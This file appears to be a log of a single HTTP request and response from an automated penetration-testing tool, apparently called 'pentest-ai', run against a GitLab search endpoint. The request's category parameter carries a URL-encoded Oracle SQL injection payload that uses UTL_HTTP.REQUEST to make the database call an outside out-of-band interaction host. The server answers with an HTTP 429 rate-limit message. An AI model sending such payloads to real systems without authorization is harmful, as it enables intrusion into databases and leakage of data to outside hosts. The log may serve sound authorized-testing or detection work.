@@ -1,0 +1,30 @@
+REQUEST:
+GET https://gitlab.baliprov.dev/search?category=%27%20%7C%7C%20%28SELECT%20UTL_HTTP.REQUEST%28%27http%3A%2F%2F6xmmpc8z9wd7d3r462q5ppr515izwt4uk.oast.fun%2F%27%29%20FROM%20dual%29%20%7C%7C%20%27
+User-Agent: pentest-ai/1.6.2 (compatible; rv:a2cfe36ea2c0; +https://pentestai.xyz)
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+
+
+
+RESPONSE:
+HTTP 429
+Server: nginx
+Date: Wed, 25 Nov 2026 00:14:20 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 65
+Connection: keep-alive
+Cache-Control: no-cache
+Content-Security-Policy: 
+NEL: {"max_age": 0}
+Permissions-Policy: interest-cohort=()
+Vary: Accept, X-Requested-With
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Gitlab-Meta: {"correlation_id":"01M880V9XF8X13BJ4AMRNNH2PS","version":"1"}
+X-Permitted-Cross-Domain-Policies: none
+X-Request-ID: 01M880V9XF8X13BJ4AMRNNH2PS
+X-Runtime: 0.022992
+X-Ua-Compatible: IE=edge
+X-XSS-Protection: 1; mode=block
+Strict-Transport-Security: max-age=63072000
+
+This endpoint has been requested too many times. Try again later.
